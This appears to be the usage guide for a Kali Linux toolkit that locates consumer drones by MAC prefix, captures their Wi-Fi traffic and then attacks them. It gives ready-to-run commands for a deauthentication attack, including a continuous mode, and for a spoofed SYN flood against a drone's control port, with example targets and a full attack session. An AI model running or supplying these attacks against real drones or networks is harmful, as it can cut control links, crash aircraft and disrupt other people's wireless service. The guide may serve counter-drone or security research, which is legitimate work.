# D.A.R.T. Scripts — Usage Instructions

> **Platform:** Kali Linux  
> **Requires:** Python 3, aircrack-ng suite (`airmon-ng`, `airodump-ng`, `aireplay-ng`), `hping2`  
> **Wireless Adapter:** ALFA AWUS036ACM (or any monitor-mode-capable adapter)

---

## Script Overview

| Script | Purpose | Needs sudo? | Needs Monitor Mode? |
|---|---|---|---|
| `config.py` | Shared constants (interface names, paths) — edit once, used everywhere | — | — |
| `RunCommand.py` | Helper module for running shell commands silently | — | — |
| `DownloadOuiList.py` | Downloads the Wireshark OUI/manufacturer database | No | **No — run BEFORE monitor mode** |
| `DroneNicList.py` | Extracts drone-related MAC prefixes from the OUI database | No | No |
| `MonitorModeManager.py` | Starts and manages monitor mode on the wireless adapter | Yes | — (it *creates* monitor mode) |
| `MonitorBssidFind.py` | Scans for nearby Wi-Fi networks, shows BSSIDs | Yes | Yes |
| `MonitorBssidTrack.py` | Locks onto a specific BSSID and captures packets to a file | Yes | Yes |
| `DeauthCommand.py` | Sends deauthentication packets to disconnect a target from its network | Yes | Yes |
| `DdosCommand.py` | Sends a SYN flood to a target IP and port | Yes | Yes |

---

## Step-by-Step Workflow

### Step 0 — Configure Your Interface

Open `config.py` and set `INTERFACE` to match your wireless adapter's name (e.g., `wlan0`, `wlan1`). Find it by running:

```bash
ifconfig
# or
iwconfig
```

The monitor-mode interface name (`MON_INTERFACE`) and other paths are derived automatically from this value.

---

### Step 1 — Download the OUI Database (while you still have internet)

```bash
python DownloadOuiList.py
```

Downloads the Wireshark manufacturer database (`manuf.txt`) to the scripts folder. This file maps MAC address prefixes to manufacturer names.

> [!IMPORTANT]
> **Run this before entering monitor mode.** Monitor mode kills your network connection, so the download must happen first.

**Optional flags:**
- `--output /path/to/manuf.txt` — save to a custom location
- `--url <URL>` — use an alternate download source

---

### Step 2 — Extract Drone MAC Prefixes

```bash
python DroneNicList.py
```

Parses `manuf.txt` and prints every OUI prefix belonging to known drone manufacturers (DJI, Parrot, Autel, Yuneec, Espressif, etc.). This tells you which MAC prefixes to watch for when scanning.

**Optional flags:**
- `--manuf /path/to/manuf.txt` — use a manuf file from a custom location

**As an importable module** (for use in other scripts):
```python
from DroneNicList import load_drone_ouis

drone_ouis = load_drone_ouis()            # dict: OUI prefix → manufacturer name
prefixes   = set(drone_ouis.keys())        # set for fast lookup
```

---

### Step 3 — Start Monitor Mode

```bash
sudo python MonitorModeManager.py
```

This does three things:
1. Kills interfering processes (`airmon-ng check kill`)
2. Puts your wireless adapter into monitor mode (`airmon-ng start <interface>`)
3. Creates a lock file (`/tmp/dart_mm.lock`) that signals to all other scripts that monitor mode is active

The script keeps running and **holds monitor mode open** until you press `Ctrl+C`, at which point it automatically:
- Stops monitor mode
- Restarts NetworkManager
- Removes the lock file

> [!WARNING]
> **Your normal Wi-Fi and internet will be unavailable while monitor mode is active.** This is expected — `airmon-ng check kill` shuts down NetworkManager. Everything is restored when you stop the script.

**Keep this terminal open.** Open new terminals for the remaining steps.

---

### Step 4 — Scan for Nearby Networks (Find Your Target)

In a **new terminal**:

```bash
sudo python MonitorBssidFind.py
```

Launches `airodump-ng` on the monitor interface, showing all nearby Wi-Fi networks with their:
- **BSSID** (MAC address of the access point)
- **Channel**
- **ESSID** (network name)
- **Signal strength**, encryption type, etc.

Look for your target drone's network. For example, the Snaptain S5C broadcasts an open AP named something like `SNAPTAIN-xxxx`.

**Press `Ctrl+C`** once you've identified the target's BSSID and channel.

---

### Step 5 — Lock Onto the Target and Capture Packets

```bash
sudo python MonitorBssidTrack.py <channel> <BSSID>
```

**Example:**
```bash
sudo python MonitorBssidTrack.py 2 14:95:69:E9:48:C6
```

Locks the adapter to the target's channel and captures all packets from that BSSID. Saves capture files (`.cap`, `.csv`) to `~/Desktop` by default.

**Optional flags:**
- `--output /path/to/prefix` — custom output directory/file prefix

**Press `Ctrl+C`** to stop capturing.

---

### Step 6 — Attack Commands

With monitor mode active and your target identified, you can run either of the attack scripts in a **new terminal**:

#### Deauthentication Attack

Disconnects clients from the target access point by injecting deauth packets:

```bash
sudo python DeauthCommand.py <BSSID> <count>
```

**Examples:**
```bash
# Send 10 deauth packets to all clients on the target AP
sudo python DeauthCommand.py 14:95:69:E9:48:C6 10

# Continuous deauth (runs until Ctrl+C)
sudo python DeauthCommand.py 14:95:69:E9:48:C6 0

# Target a specific client device
sudo python DeauthCommand.py 14:95:69:E9:48:C6 10 --client 11:22:33:44:55:66
```

#### DDoS (SYN Flood) Attack

Floods a target IP and port with spoofed SYN packets:

```bash
sudo python DdosCommand.py <packets> <port> <target_ip>
```

**Example:**
```bash
# Send 1500 SYN packets to the drone's control port
sudo python DdosCommand.py 1500 8866 172.19.10.1
```

---

### Step 7 — Stop Monitor Mode

Go back to the terminal running `MonitorModeManager.py` and press `Ctrl+C`. This cleanly:
- Stops monitor mode on the adapter
- Restarts NetworkManager (restores your internet)
- Removes the lock file

---

## Quick Reference: Typical Session

```bash
# Terminal 1 — prep (with internet still available)
python DownloadOuiList.py
python DroneNicList.py

# Terminal 1 — start monitor mode (internet goes down)
sudo python MonitorModeManager.py

# Terminal 2 — find the drone's network
sudo python MonitorBssidFind.py
# (note the BSSID and channel, then Ctrl+C)

# Terminal 3 — capture packets from the drone
sudo python MonitorBssidTrack.py 2 14:95:69:E9:48:C6

# Terminal 4 — run an attack
sudo python DeauthCommand.py 14:95:69:E9:48:C6 0

# When done: Ctrl+C in Terminal 1 to restore networking
```

---

## Support Scripts (Not Run Directly)

| Script | What It Does |
|---|---|
| `config.py` | Defines `INTERFACE`, `MON_INTERFACE`, `MM_LOCK_FILE`, and `OUTPUT_DIR`. Edit `INTERFACE` here to match your adapter — all other scripts import from it. |
| `RunCommand.py` | Provides a `run_command()` helper that executes shell commands with stdout/stderr suppressed. Used internally by `MonitorModeManager.py`. |
